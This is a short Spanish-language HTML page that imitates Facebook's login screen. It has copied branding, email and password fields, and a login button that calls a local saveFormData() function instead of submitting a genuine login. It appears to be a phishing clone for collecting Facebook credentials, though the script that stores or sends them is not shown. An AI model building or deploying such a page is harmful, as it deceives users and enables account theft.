<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="shortcut icon" href="pngwing.com.png" type="image/x-icon">
    <link rel="stylesheet" href="facebook/estilo.css">
    <title>Facebook</title>
   
    
</head>
<body>
    <div class="container">
        <div class="left-column">
            <h1>facebook</h1>
            <p>Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</p>
        </div>

        <div class="right-column">
            <h2>Iniciar sesión en Facebook</h2>
            <div class="input-box">
                <label for="email">Correo electrónico o teléfono</label>
                <input type="text" id="email" name="email">
            </div>
            <div class="input-box">
                <label for="password">Contraseña</label>
                <input type="password" id="password" name="password">
            </div>
            <button class="login-button" onclick="saveFormData()">Iniciar sesión</button>
            <div class="forgotten-password">
                <a href="#">¿Olvidaste tu contraseña?</a>
            </div>
            <a href="#" class="create-account-button">Crear cuenta nueva</a>
        </div>
    </div>
    <script src="java/java.js"></script>
</body>
</html>
